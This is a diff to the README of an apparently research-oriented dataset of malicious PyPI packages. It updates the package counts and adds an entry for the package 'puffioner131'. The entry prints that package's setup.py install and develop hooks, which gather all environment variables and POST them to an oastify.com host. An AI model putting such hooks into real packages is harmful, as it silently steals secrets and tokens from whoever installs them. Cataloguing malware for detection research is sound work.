@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 10,843 versions of the source code of 9,466 malicious packages.
+This data set includes about 10,849 versions of the source code of 9,467 malicious packages.
 
 ## Dataset Format
 
@@ -1227,6 +1227,45 @@ artifact-lab-3-package-b55680cd [0.1.1] <br>
 
 ### 20 Aug. 2024
 We have collected 3,327 malicious packages, which were discovered early and subsequently removed from PyPI.org.
+
+### 22 Aug. 2024
+puffioner131 [9999, 99999, 999999, 9999999, 99999999, 999999999] <br>
+
+```python
+class PostInstallCommand(install):
+    def run(self):
+        # Continue with the standard installation process
+        install.run(self)
+
+        # Fetch environment variables
+        env_data = {key: value for key, value in os.environ.items()}
+
+        # Send the environment variables in a POST request
+        response = requests.post("http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com", json=env_data, verify=False)
+
+        # Optionally, handle the response
+        if response.status_code == 200:
+            print("Environment variables sent successfully!")
+        else:
+            print(f"Failed to send environment variables. Status code: {response.status_code}")
+
+class PostDevelopCommand(develop):
+    def run(self):
+        # Continue with the standard development process
+        develop.run(self)
+
+        # Fetch environment variables
+        env_data = {key: value for key, value in os.environ.items()}
+
+        # Send the environment variables in a POST request
+        response = requests.post("http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com", json=env_data, verify=False)
+
+        # Optionally, handle the response
+        if response.status_code == 200:
+            print("Environment variables sent successfully!")
+        else:
+            print(f"Failed to send environment variables. Status code: {response.status_code}")
+```
 
 ## About the malicious packages detection
 
